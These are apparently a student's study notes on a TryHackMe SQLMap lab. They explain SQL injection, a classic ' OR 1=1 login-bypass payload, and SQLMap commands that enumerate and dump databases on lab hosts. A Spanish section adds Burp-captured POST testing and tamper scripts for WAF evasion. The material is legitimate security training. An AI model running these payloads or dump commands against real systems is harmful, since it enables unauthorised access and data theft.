# 🛡️ TryHackMe — Cybersecurity 101

## Module: SQLMap — The Basics | SQL Injection | Study Summary

> **Keywords:** SQL Injection · SQLMap · GET Parameter · POST Request · Boolean-Based Blind · Error-Based · Time-Based Blind · UNION Query · Database Enumeration · Cookie-Based Testing

---

## 📚 Table of Contents

1. [How Websites Interact with Databases](#1-how-websites-interact-with-databases)
2. [SQL Injection Vulnerability](#2-sql-injection-vulnerability)
3. [The Classic SQLi Bypass — How it Works](#3-the-classic-sqli-bypass--how-it-works)
4. [SQLMap — Automated SQL Injection Tool](#4-sqlmap--automated-sql-injection-tool)
5. [SQLMap Flags & Command Reference](#5-sqlmap-flags--command-reference)
6. [SQL Injection Types Detected by SQLMap](#6-sql-injection-types-detected-by-sqlmap)
7. [Full Attack Workflow](#7-full-attack-workflow)
8. [Quick Reference Cheatsheet](#8-quick-reference-cheatsheet)

---

## 1. How Websites Interact with Databases

A **database** is a structured collection of data that can be stored, modified, and retrieved. Almost every dynamic website relies on one:

- A **login page** queries the database to verify credentials
- A **search field** queries the database to fetch matching records
- A **shopping cart** queries the database to retrieve product information

This interaction is managed by a **Database Management System (DBMS)** — such as MySQL, PostgreSQL, SQLite, or Microsoft SQL Server — which understands **SQL (Structured Query Language)**.

**Example — what happens when you log in:**

```
User enters: username = John | password = Un@detectable444
                    ↓
Website builds SQL query and sends it to the DB:
SELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';
                    ↓
Database checks → both match → returns user record → login succeeds
```

---

## 2. SQL Injection Vulnerability

**SQL Injection (SQLi)** occurs when a web application **fails to validate or sanitize user input**, allowing an attacker to inject malicious SQL code into the query that the application sends to the database.

Because all critical organizational data lives in databases, a successful SQL injection can lead to:

- **Authentication bypass** — logging in without valid credentials
- **Data exfiltration** — reading sensitive records (users, passwords, PII)
- **Data manipulation** — modifying or deleting database records
- **Full database compromise** — dumping entire databases

> ⚠️ **Legal notice:** Only attempt SQL injection against systems you have explicit written permission to test.

---

## 3. The Classic SQLi Bypass — How it Works

### Scenario: Login Form Without Input Validation

**Normal login query:**

```sql
SELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';
```

Both conditions must be true (AND) for login to succeed.

**Attacker's input:**

```
Username: John
Password: abc' OR 1=1;-- -
```

**Resulting query sent to the database:**

```sql
SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';
```

### Why This Works — Step by Step

| Part               | What happens                                                   |
| ------------------ | -------------------------------------------------------------- |
| `password = 'abc'` | Fails — John doesn't have this password                        |
| `OR 1=1`           | Always evaluates to TRUE — overrides the failed password check |
| `;-- -`            | Comments out everything after — the closing `'` is ignored     |
| **Result**         | Query succeeds → attacker is logged in as John                 |

### The Role of the Single Quote `'`

The single quote `'` after `abc` is critical. Without it, the entire string `abc OR 1=1;-- -` would be treated as the password value (one string). With it, `abc` is closed as a string value and `OR 1=1` becomes a separate logical condition injected into the query structure.

```
Without ':   password = 'abc OR 1=1;-- -'    ← treated as one string, login fails
With ':      password = 'abc' OR 1=1;-- -'   ← abc closes, OR 1=1 executes as logic
```

---

## 4. SQLMap — Automated SQL Injection Tool

**SQLMap** is an open-source automated tool for **detecting and exploiting SQL injection vulnerabilities** in web applications. It eliminates the need to manually craft injection payloads and handles the entire process of identification and extraction.

- Pre-installed on Kali Linux and many security-focused distributions
- Can be installed manually if not present
- Command-line tool — used from the terminal

### Getting Started

```bash
# List all available flags
sqlmap --help

# Interactive wizard mode (guided — ideal for beginners)
sqlmap --wizard
```

### Two Testing Approaches

| Approach                 | When to use                                                                            | Command                                       |
| ------------------------ | -------------------------------------------------------------------------------------- | --------------------------------------------- |
| **GET-based testing**    | When the target uses GET parameters in the URL (e.g. `?cat=1`, `?id=5`)                | `sqlmap -u "URL"`                             |
| **POST-based testing**   | When the target uses POST requests (login forms, registration forms)                   | `sqlmap -r intercepted_request.txt`           |
| **Cookie-based testing** | When the endpoint requires authentication — session cookies are passed with `--cookie` | `sqlmap -u "URL" --cookie="SESSIONID=abc123"` |

> 💡 **POST testing workflow:** Intercept the POST request with Burp Suite, save it as a `.txt` file, then pass it to SQLMap with `-r`. This ensures SQLMap sends the exact same request the browser would.

> 💡 **Cookie-based testing:** Many real-world applications require authentication before certain pages are reachable. Capturing the session cookie after logging in via browser and passing it with `--cookie` ensures SQLMap tests the application as an authenticated user.

---

## 5. SQLMap Flags & Command Reference

### Core Flags

| Flag                   | Description                                                       |
| ---------------------- | ----------------------------------------------------------------- |
| `-u <URL>`             | Target URL for GET-based testing                                  |
| `-r <file>`            | Load an intercepted HTTP request from a file (POST-based testing) |
| `--cookie="KEY=VALUE"` | Include session cookies for authenticated testing                 |
| `--dbs`                | Enumerate all available database names                            |
| `-D <db_name>`         | Specify a database to work with                                   |
| `--tables`             | List all tables in the specified database                         |
| `-T <table_name>`      | Specify a table to work with                                      |
| `--dump`               | Extract (dump) all records from the specified table               |
| `--wizard`             | Interactive guided mode — walks through the scan step by step     |

### Command Progression (Typical Attack Flow)

```bash
# Step 1 — Test URL for SQLi vulnerability
sqlmap -u "http://target.thm/search?cat=1"

# Step 2 — Extract all database names
sqlmap -u "http://target.thm/search?cat=1" --dbs

# Step 3 — List tables in a specific database
sqlmap -u "http://target.thm/search?cat=1" -D users --tables

# Step 4 — Dump records from a specific table
sqlmap -u "http://target.thm/search?cat=1" -D users -T thomas --dump

# POST-based (using intercepted request file)
sqlmap -r intercepted_request.txt

# With session cookie (authenticated testing)
sqlmap -u "http://target.thm/dashboard" --cookie="PHPSESSID=abc123"
```

---

## 6. SQL Injection Types Detected by SQLMap

When SQLMap confirms a vulnerability, it identifies which injection techniques are applicable. Each technique has a different mechanism and use case:

| Type                    | How it works                                                                                                                                              | Indicator              |
| ----------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------- |
| **Boolean-based blind** | Injects a condition that is always true (e.g. `AND 1=1`) and compares responses. No data is returned directly — differences in response indicate a match. | `AND 2175=2175`        |
| **Error-based**         | Deliberately crafts queries that cause the DB to return error messages containing data. The error output leaks information.                               | `EXTRACTVALUE(...)`    |
| **Time-based blind**    | Injects a time delay (e.g. `SLEEP(5)`) — if the server responds slowly, the injection point is confirmed. Used when no output is visible.                 | `AND SLEEP(5)`         |
| **UNION query**         | Appends a `UNION SELECT` to the original query to retrieve data from other tables directly in the response.                                               | `UNION ALL SELECT ...` |

> 💡 SQLMap automatically selects and applies the most effective technique(s) based on the target's behavior. Multiple types can be confirmed simultaneously.

---

## 7. Full Attack Workflow

### Demo Target: `http://sqlmaptesting.thm/search/cat=1`

**Step 1 — Confirm the vulnerability:**

```bash
sqlmap -u http://sqlmaptesting.thm/search/cat=1
```

SQLMap detects: boolean-based blind, error-based, time-based blind, UNION query all confirmed on parameter `cat`.

**Step 2 — Extract database names:**

```bash
sqlmap -u http://sqlmaptesting.thm/search/cat=1 --dbs
```

Result:

```
available databases [2]:
[*] users
[*] members
```

**Step 3 — List tables in the `users` database:**

```bash
sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users --tables
```

Result:

```
Database: users
[3 tables]
+-----------+
| johnath   |
| alexas    |
| thomas    |
+-----------+
```

**Step 4 — Dump records from the `thomas` table:**

```bash
sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users -T thomas --dump
```

Result:

```
Database: users
Table: thomas
[1 entry]
+-------------+------------+---------+
| Date        | name       | pass    |
+-------------+------------+---------+
| 09/09/2024  | Thomas THM | testing |
+-------------+------------+---------+
```

---

## 8. Quick Reference Cheatsheet

### Attack Flow Summary

```
1. Identify a URL with GET parameters (e.g. ?id=1, ?cat=1)
   OR intercept a POST request with Burp Suite → save as .txt
          ↓
2. Run SQLMap to confirm SQLi vulnerability
   sqlmap -u "URL"  OR  sqlmap -r request.txt
          ↓
3. Extract database names
   sqlmap -u "URL" --dbs
          ↓
4. List tables in target database
   sqlmap -u "URL" -D <database> --tables
          ↓
5. Dump records from target table
   sqlmap -u "URL" -D <database> -T <table> --dump
```

### Key Terminology

| Term                     | Definition                                                                                                                           |
| ------------------------ | ------------------------------------------------------------------------------------------------------------------------------------ |
| **SQL Injection (SQLi)** | An attack where malicious SQL code is injected into an application's query due to missing input validation.                          |
| **Input sanitization**   | The process of validating and cleaning user input before including it in a database query. The absence of this is what enables SQLi. |
| **GET parameter**        | A value passed in the URL (e.g. `?cat=1`). Visible in the address bar — a common SQLi entry point.                                   |
| **POST request**         | Data sent in the HTTP request body (e.g. login forms). Not visible in the URL.                                                       |
| **Boolean-based blind**  | SQLi technique using always-true conditions to infer data from response differences.                                                 |
| **Time-based blind**     | SQLi technique using time delays to confirm injection when no output is visible.                                                     |
| **Error-based**          | SQLi technique that extracts data from database error messages.                                                                      |
| **UNION query**          | SQLi technique that appends a secondary SELECT to retrieve data from other tables.                                                   |
| **`--dump`**             | SQLMap flag that extracts all records from a specified table.                                                                        |
| **`-r` flag**            | SQLMap flag to load and test an intercepted HTTP request from a saved file.                                                          |
| **`--cookie`**           | SQLMap flag to include session cookies — required for testing authenticated endpoints.                                               |
| **DBMS**                 | Database Management System — software that manages the database (MySQL, PostgreSQL, SQLite, etc.).                                   |

---

## 📝 My Notes & Questions

> Ejemplo de un SQLmap POST:
> 
> ### Paso 1 — Abrir Burp Suite e interceptar el POST request
> 
> Activas FoxyProxy, Intercept ON, y envías el formulario con datos cualquiera:
>     Username: admin
>     Password: test123
> 
> Burp captura el request antes de que llegue al servidor:
> 
> http
>     POST /login HTTP/1.1
>     Host: target.thm
>     Content-Type: application/x-www-form-urlencoded
>     Content-Length: 30
>     Cookie: PHPSESSID=abc123xyz
> 
>     username=admin&password=test123
> 
> * * *
> 
> ### Paso 2 — Guardar el request en un archivo
> 
> En Burp, click derecho sobre el request → **Save item** → lo guardas como `login_request.txt`.
> 
> El archivo queda exactamente así:
>     POST /login HTTP/1.1
>     Host: target.thm
>     Content-Type: application/x-www-form-urlencoded
>     Content-Length: 30
>     Cookie: PHPSESSID=abc123xyz
> 
>     username=admin&password=test123
> 
> > 💡 El archivo debe incluir **todo** — headers, línea en blanco, y el body. SQLMap lo necesita completo para replicar exactamente el mismo request.
> 
> * * *
> 
> ### Paso 3 — Pasar el archivo a SQLMap para detectar vulnerabilidad
> 
> bash
>     sqlmap -r login_request.txt
> 
> SQLMap lee el archivo, replica el POST request, y empieza a probar cada parámetro del body (`username` y `password`) con distintos payloads de inyección.
> 
> Output esperado si encuentra algo:
>     [INFO] testing parameter 'username'
>     [INFO] GET parameter 'username' appears to be 'MySQL >= 5.0 AND time-based blind' injectable
>     [INFO] parameter 'username' is vulnerable
> 
> * * *
> 
> ### Paso 4 — Extraer las bases de datos
> 
> Una vez confirmada la vulnerabilidad:
> 
> bash
>     sqlmap -r login_request.txt --dbs
> 
> Output:
>     available databases [3]:
>     [*] information_schema
>     [*] users_db
>     [*] company_data
> 
> * * *
> 
> ### Paso 5 — Listar tablas de la base de datos interesante
> 
> bash
>     sqlmap -r login_request.txt -D users_db --tables
> 
> Output:
>     Database: users_db
>     [2 tables]
>     +----------+
>     | accounts |
>     | sessions |
>     +----------+
> 
> * * *
> 
> ### Paso 6 — Dumpear los registros
> 
> bash
>     sqlmap -r login_request.txt -D users_db -T accounts --dump
> 
> Output:
>     Database: users_db
>     Table: accounts
>     [3 entries]
>     +----+----------+------------------+
>     | id | username | password         |
>     +----+----------+------------------+
>     | 1  | admin    | 5f4dcc3b5aa76... |
>     | 2  | john     | 482c811da5d5... |
>     | 3  | alice    | d8578edf8458... |
>     +----+----------+------------------+
> 
> SQLMap incluso te preguntará si quieres intentar crackear los hashes con un diccionario — exactamente el mismo proceso que viste con John the Ripper.
> 
> * * *
> 
> ### El flujo completo resumido
> 
>     Formulario en el browser
>              ↓
>     FoxyProxy ON + Intercept ON en Burp
>              ↓
>     Enviar el form con datos dummy
>              ↓
>     Burp captura el POST request
>              ↓
>     Guardar como login_request.txt
>              ↓
>     sqlmap -r login_request.txt          ← detecta vulnerabilidad
>     sqlmap -r login_request.txt --dbs    ← lista databases
>     sqlmap -r login_request.txt -D <db> --tables   ← lista tablas
>     sqlmap -r login_request.txt -D <db> -T <tabla> --dump  ← extrae datos
> 
> La diferencia clave con GET testing es simplemente **de dónde vienen los parámetros** — en GET están en la URL (`?username=admin`), en POST están en el body del request. SQLMap maneja ambos de forma idéntica una vez que tiene el request completo.
> 
> SQLMap los tiene **completamente integrados**. Es una de sus principales ventajas — no necesitas saber ni construir un solo payload manualmente.
> 
> ### ¿Cuándo SÍ necesitas intervenir con los payloads?
> 
> Hay situaciones donde puedes guiar a SQLMap para ser más eficiente o evadir defensas:
> 
> bash
>     # Especificar solo ciertas técnicas (más rápido)
>     sqlmap -r request.txt --technique=BT    # solo Boolean y Time-based
> 
>     # Especificar el DBMS si ya lo sabes (evita probar otros)
>     sqlmap -r request.txt --dbms=mysql
> 
>     # Usar un nivel de agresividad mayor (más payloads, más ruido)
>     sqlmap -r request.txt --level=5 --risk=3
> 
>     # Usar tamper scripts para evadir WAFs (modifican los payloads)
>     sqlmap -r request.txt --tamper=space2comment
> 
> Los **tamper scripts** son el caso más avanzado — son pequeños scripts que transforman los payloads para evadir firewalls o filtros. Por ejemplo, `space2comment` convierte `SELECT username` en `SELECT/**/username` para bypassear filtros que bloquean espacios. SQLMap trae decenas incluidos y puedes escribir los tuyos.

---

*TryHackMe — Cybersecurity 101 | SQLMap — The Basics | SQL Injection*
